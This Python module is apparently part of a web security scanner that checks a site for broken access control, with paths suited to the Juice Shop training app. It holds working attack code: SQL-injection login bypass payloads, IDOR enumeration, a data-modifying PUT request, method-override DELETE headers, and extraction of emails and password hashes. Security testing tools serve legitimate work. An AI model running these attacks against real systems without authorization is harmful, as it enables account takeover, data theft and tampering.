"""Broken Access Control: IDOR, horizontal/vertical privilege escalation, admin endpoint exposure."""
import json
import logging
import re
from typing import List, Optional
from urllib.parse import urlparse

from core.vuln_types import VT

logger = logging.getLogger(__name__)

class ACLFinding:
    _CATEGORY_MAP = (
        ("Insecure Direct Object Reference",  VT.IDOR),
        ("IDOR",                              VT.IDOR),
        ("HTTP Method Override",              VT.HTTP_METHOD_OVERRIDE),
        ("HTTP Parameter Pollution",          VT.PARAMETER_POLLUTION),
        ("Mass Assignment",                   VT.MASS_ASSIGNMENT),
        ("Broken Access Control",             VT.BROKEN_ACCESS_CONTROL),
    )

    def __init__(self, vuln_type, url, parameter, payload, evidence,
                 severity="High", confidence=0.85, exploitable=True):
        self.vuln_type = vuln_type
        self.url = url
        self.parameter = parameter
        self.payload = payload
        self.evidence = evidence
        self.severity = severity
        self.confidence = confidence
        self.exploitable = exploitable
        self.category = next((c for p, c in self._CATEGORY_MAP if vuln_type.startswith(p)), "")

    def to_dict(self):
        return {
            "type": self.vuln_type,
            "url": self.url,
            "parameter": self.parameter,
            "payload": self.payload,
            "evidence": self.evidence,
            "severity": self.severity,
            "confidence": self.confidence,
            "exploitable": self.exploitable,
            "category": self.category,
        }


class AccessControlModule:
    # REST resource paths that should be authenticated/authorized
    _RESOURCE_PATHS = [
        "/api/Users",
        "/api/Users/1",
        "/api/Users/2",
        "/api/Users/3",
        "/api/Baskets/1",
        "/api/Baskets/2",
        "/api/Orders",
        "/api/Orders/1",
        "/api/Feedbacks",
        "/api/Feedbacks/1",
        "/api/Complaints",
        "/api/Complaints/1",
        "/api/Recycles",
        "/api/Recycles/1",
        "/api/Challenges",
        "/api/Quantitys",
        "/api/SecurityQuestions",
        "/api/SecurityAnswers",
        "/api/Deliverys",
        "/api/Captchas",
        "/api/Wallets",
        "/api/Wallets/1",
        "/api/PrivacyRequests",
        "/api/PrivacyRequests/1",
    ]
    # Admin-only paths
    _ADMIN_PATHS = [
        "/administration",
        "/administration/",
        "/rest/admin/application-version",
        "/rest/admin/application-configuration",
        "/api/Users?deleted=true",
    ]
    # Hidden/obscured paths (security through obscurity)
    _OBSCURE_PATHS = [
        "/score-board",
        "/#/score-board",
        "/ftp/",
        "/ftp/acquisitions.md",
        "/ftp/coupons_2013.md",
        "/ftp/eastere.gg",
        "/ftp/incident-support.kdbx",
        "/ftp/legal.md",
        "/ftp/package.json.bak",
        "/ftp/quarantine/",
        "/ftp/suspicious_errors.yml",
        "/encryptionkeys/",
        "/encryptionkeys/jwt.pub",
        "/b2b/v2/orders",
        "/b2b/v2/",
        "/metrics",
        "/support/logs",
        "/we-are-so-excited.png",
    ]

    def __init__(self, http_engine, evasion_engine=None):
        self.http = http_engine
        self._seen: set = set()

    def scan(self, url: str) -> List[ACLFinding]:
        parsed = urlparse(url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        if origin in self._seen:
            return []
        self._seen.add(origin)

        results: List[ACLFinding] = []
        results.extend(self._test_unauthenticated_api(origin))
        results.extend(self._test_idor(origin))
        results.extend(self._test_admin_paths(origin))
        results.extend(self._test_obscure_paths(origin))
        results.extend(self._test_method_override(origin))
        results.extend(self._test_parameter_pollution(origin))
        return results

    def _test_unauthenticated_api(self, origin: str) -> List[ACLFinding]:
        results: List[ACLFinding] = []
        for path in self._RESOURCE_PATHS:
            try:
                resp = self.http.get(f"{origin}{path}")
                if not resp:
                    continue
                if resp.status_code == 200 and len(resp.text) > 30:
                    try:
                        data = resp.json()
                        # Contains real data (not an error/empty response)
                        records = data.get("data") or data
                        if records and records != [] and records != {}:
                            severity = "Critical" if "Users" in path else "High"
                            evidence_hint = self._extract_sensitive(resp.text)
                            results.append(ACLFinding(
                                vuln_type="Broken Access Control (Unauthenticated Resource Access)",
                                url=f"{origin}{path}",
                                parameter="-",
                                payload=f"GET {path}",
                                evidence=f"HTTP 200 without auth → {evidence_hint}",
                                severity=severity,
                                confidence=0.92,
                            ))
                    except Exception:
                        pass
            except Exception:
                pass
        return results

    def _test_idor(self, origin: str) -> List[ACLFinding]:
        results: List[ACLFinding] = []
        # Find authenticated token via login bypass first
        token = self._get_token_via_bypass(origin)

        # IDOR: access resource IDs we shouldn't be able to access
        idor_paths = [
            ("/api/Baskets/{id}", range(1, 10)),
            ("/api/Users/{id}",   range(1, 10)),
            ("/api/Orders/{id}",  range(1, 5)),
            ("/api/Wallets/{id}", range(1, 5)),
        ]
        for path_template, id_range in idor_paths:
            for rid in id_range:
                path = path_template.replace("{id}", str(rid))
                try:
                    headers = {"Authorization": f"Bearer {token}"} if token else {}
                    resp = self.http.get(f"{origin}{path}", headers=headers)
                    if not resp or resp.status_code != 200:
                        continue
                    try:
                        data = resp.json().get("data")
                        if data:
                            results.append(ACLFinding(
                                vuln_type="Insecure Direct Object Reference (IDOR)",
                                url=f"{origin}{path}",
                                parameter="id",
                                payload=f"GET {path}",
                                evidence=f"Resource ID {rid} accessible → {resp.text[:200]}",
                                severity="High",
                                confidence=0.88,
                            ))
                            break
                    except Exception:
                        pass
                except Exception:
                    pass

        # IDOR: change basket ownership via PUT
        if token:
            try:
                body = json.dumps({"UserId": 1})
                resp = self.http.put(
                    f"{origin}/api/BasketItems/1",
                    data=body,
                    headers={"Content-Type": "application/json",
                             "Authorization": f"Bearer {token}"},
                )
                if resp and resp.status_code == 200:
                    results.append(ACLFinding(
                        vuln_type="IDOR (Basket Item Manipulation)",
                        url=f"{origin}/api/BasketItems/1",
                        parameter="UserId",
                        payload='{"UserId":1}',
                        evidence=f"Basket item modified for arbitrary user → {resp.text[:150]}",
                        severity="High",
                        confidence=0.85,
                    ))
            except Exception:
                pass

        return results

    def _test_admin_paths(self, origin: str) -> List[ACLFinding]:
        results: List[ACLFinding] = []
        for path in self._ADMIN_PATHS:
            clean = path.lstrip("/#") if path.startswith("/#") else path
            if not clean.startswith("/"):
                clean = "/" + clean
            try:
                resp = self.http.get(f"{origin}{clean}")
                if resp and resp.status_code == 200 and len(resp.text) > 20:
                    results.append(ACLFinding(
                        vuln_type="Broken Access Control (Admin Interface Accessible)",
                        url=f"{origin}{clean}",
                        parameter="-",
                        payload=f"GET {clean}",
                        evidence=f"HTTP 200 → {resp.text[:180]}",
                        severity="Critical",
                        confidence=0.90,
                    ))
            except Exception:
                pass
        return results

    def _test_obscure_paths(self, origin: str) -> List[ACLFinding]:
        results: List[ACLFinding] = []
        for path in self._OBSCURE_PATHS:
            clean = path.lstrip("/#") if path.startswith("/#") else path
            if not clean.startswith("/"):
                clean = "/" + clean
            try:
                resp = self.http.get(f"{origin}{clean}")
                if not resp or resp.status_code not in (200, 206):
                    continue
                if len(resp.text) < 5 and not resp.headers.get("content-length"):
                    continue
                content_type = resp.headers.get("content-type", "")
                severity = "High"
                vuln_type = "Security Through Obscurity (Hidden Endpoint Exposed)"
                if "ftp" in path:
                    severity = "High"
                    vuln_type = "Sensitive File Exposure via FTP Directory"
                elif "score-board" in path:
                    severity = "Low"
                    vuln_type = "Hidden Score Board Accessible (Improper Input Validation)"
                elif "encryptionkeys" in path:
                    severity = "Critical"
                    vuln_type = "Encryption Keys Exposed"
                elif "metrics" in path or "logs" in path:
                    severity = "Medium"
                    vuln_type = "Observability Endpoint Exposed"

                results.append(ACLFinding(
                    vuln_type=vuln_type,
                    url=f"{origin}{clean}",
                    parameter="-",
                    payload=f"GET {clean}",
                    evidence=f"HTTP {resp.status_code} len={len(resp.text)}B → {resp.text[:150]}",
                    severity=severity,
                    confidence=0.90,
                ))
            except Exception:
                pass
        return results

    def _test_method_override(self, origin: str) -> List[ACLFinding]:
        results: List[ACLFinding] = []
        # Try HTTP method override to bypass access controls
        override_headers = [
            {"X-HTTP-Method-Override": "DELETE"},
            {"X-Method-Override": "DELETE"},
            {"_method": "DELETE"},
        ]
        test_url = f"{origin}/api/Feedbacks/1"
        for headers in override_headers:
            try:
                resp = self.http.get(test_url, headers=headers)
                if resp and resp.status_code == 200:
                    results.append(ACLFinding(
                        vuln_type="HTTP Method Override (Access Control Bypass)",
                        url=test_url,
                        parameter=list(headers.keys())[0],
                        payload=str(headers),
                        evidence=f"DELETE via header override accepted → {resp.status_code}",
                        severity="Medium",
                        confidence=0.80,
                    ))
                    break
            except Exception:
                pass
        return results

    def _test_parameter_pollution(self, origin: str) -> List[ACLFinding]:
        results: List[ACLFinding] = []
        # HTTP Parameter Pollution to access other users' data
        try:
            resp = self.http.get(f"{origin}/api/Users?id=1&id=2")
            if resp and resp.status_code == 200 and '"data"' in resp.text:
                try:
                    data = resp.json().get("data", [])
                    if isinstance(data, list) and len(data) > 1:
                        results.append(ACLFinding(
                            vuln_type="HTTP Parameter Pollution",
                            url=f"{origin}/api/Users",
                            parameter="id",
                            payload="?id=1&id=2",
                            evidence=f"Parameter pollution returned multiple records → {resp.text[:150]}",
                            severity="Medium",
                            confidence=0.80,
                        ))
                except Exception:
                    pass
        except Exception:
            pass
        return results

    def _get_token_via_bypass(self, origin: str) -> Optional[str]:
        login_paths = ["/rest/user/login", "/api/auth/login", "/api/login"]
        sqli_payloads = [
            {"email": "' OR 1=1--", "password": "x"},
            {"email": "a' or 1=1--", "password": "x"},
        ]
        for path in login_paths:
            for payload in sqli_payloads:
                try:
                    resp = self.http.post(
                        f"{origin}{path}",
                        data=json.dumps(payload),
                        headers={"Content-Type": "application/json"},
                    )
                    if resp and resp.status_code == 200:
                        data = resp.json()
                        token = ((data.get("authentication") or {}).get("token")
                                 or data.get("token") or data.get("accessToken"))
                        if token:
                            return token
                except Exception:
                    pass
        return None

    @staticmethod
    def _extract_sensitive(text: str) -> str:
        snippets = []
        for field in ["email", "password", "passwordHash", "username", "role"]:
            m = re.search(rf'"{field}"\s*:\s*"([^"{{}}]+)"', text)
            if m:
                val = m.group(1)
                if field in ("password", "passwordHash") and len(val) > 8:
                    snippets.append(f"{field}=[HASH:{val[:16]}...]")
                else:
                    snippets.append(f"{field}={val[:30]}")
        return (", ".join(snippets) or text[:150])
